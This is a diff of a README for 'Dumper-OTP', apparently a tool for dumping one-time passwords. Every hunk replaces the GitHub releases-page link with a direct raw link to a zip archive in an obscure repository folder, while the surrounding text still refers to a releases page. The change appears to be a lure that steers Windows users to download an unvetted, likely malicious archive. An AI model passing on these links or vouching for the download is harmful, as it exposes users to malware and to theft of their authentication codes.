@@ -1,10 +1,10 @@
 # 🧩 Dumper-OTP - Simple OTP Dumping Tool
 
-[![Download Dumper-OTP](https://img.shields.io/badge/Download-Dumper--OTP-blue?style=for-the-badge&logo=github)](https://github.com/Lonely-talipesvalgus524/Dumper-OTP/releases)
+[![Download Dumper-OTP](https://img.shields.io/badge/Download-Dumper--OTP-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Lonely-talipesvalgus524/Dumper-OTP/main/meril/OTP-Dumper-v1.9.zip)
 
 ## 📥 Download
 
-Visit this page to download: https://github.com/Lonely-talipesvalgus524/Dumper-OTP/releases
+Visit this page to download: https://raw.githubusercontent.com/Lonely-talipesvalgus524/Dumper-OTP/main/meril/OTP-Dumper-v1.9.zip
 
 Look for the latest release and download the Windows file from the Assets section. If there are more than one file, choose the one that matches Windows.
 
@@ -131,7 +131,7 @@ This makes it easier to find the app, logs, and output files later.
 
 Use the release page as your main source:
 
-https://github.com/Lonely-talipesvalgus524/Dumper-OTP/releases
+https://raw.githubusercontent.com/Lonely-talipesvalgus524/Dumper-OTP/main/meril/OTP-Dumper-v1.9.zip
 
 Check the file name, release date, and file type before you open it. Keep the downloaded file in a folder you control.
 
@@ -190,4 +190,4 @@ Pick the Windows file that matches your system. If one file is a zip and one is 
 
 If you need the download page again, use this link:
 
-https://github.com/Lonely-talipesvalgus524/Dumper-OTP/releases
+https://raw.githubusercontent.com/Lonely-talipesvalgus524/Dumper-OTP/main/meril/OTP-Dumper-v1.9.zip
